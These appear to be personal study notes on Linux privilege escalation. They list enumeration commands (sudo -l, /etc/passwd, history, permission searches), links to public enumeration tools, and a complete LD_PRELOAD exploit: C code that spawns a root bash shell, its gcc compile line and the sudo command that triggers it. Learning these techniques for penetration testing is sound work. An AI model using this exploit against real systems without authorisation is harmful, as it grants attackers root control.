```shell
hostname # returns hostname of the server, informational - examp: SQL-server bla
uname -a # additional sys info about kernel
/proc/version # often is on sys, info about kernel and maby if gcc compiler exists
/etc/issue # info about OS, could be changed aka deceptive?
ps -A # viewv all running processes
ps aux # processes for all users
env # show enviromental variables
sudo -l # what bins can you run as sudo
ls -la # to see hidden files
id # to see your priveleges and your group
/etc/passwd # see users on system
history # see what commands were run previously

```

```shell
# USEFUL FIND COMMANDS
find . -name flag1.txt # find the file named “flag1.txt” in the current directory
find /home -name flag1.txt # find the file names “flag1.txt” in the /home directory
find / -type d -name config # find the directory named config under “/”
find / -type f -perm 0777 # find files with the 777 permissions (files readable, writable, and executable by all users)

find / -perm a=x # find executable files
```

List of automated tools, they may miss possible vectors or simply report false positives and that's why it's important to be able to do enumeration manually.
Also tools written in python won't run on a machine without the python interpreter installed.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)[](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

Linux kernel CVE's --- https://www.linuxkernelcves.com/cves

LD_preload
is a function that allows any program to use shared libraries.
If env_keep option is enabled in sudo -l we can generate a shared library which will be preloaded
before any program runs.
So if env_keep+=LD_PRELOAD exists next steps are:
	Write a simple C code exploit
```C
	#include <stdio.h>  
#include <sys/types.h>  
#include <stdlib.h>  
  
void _init() {  
unsetenv("LD_PRELOAD");  
setgid(0);  
setuid(0);  
system("/bin/bash");  
}
```
	We can save this code and compile it into shared object file
```shell
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
```

Now we can use the exploit with any program that we can run as sudo.
```shell
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```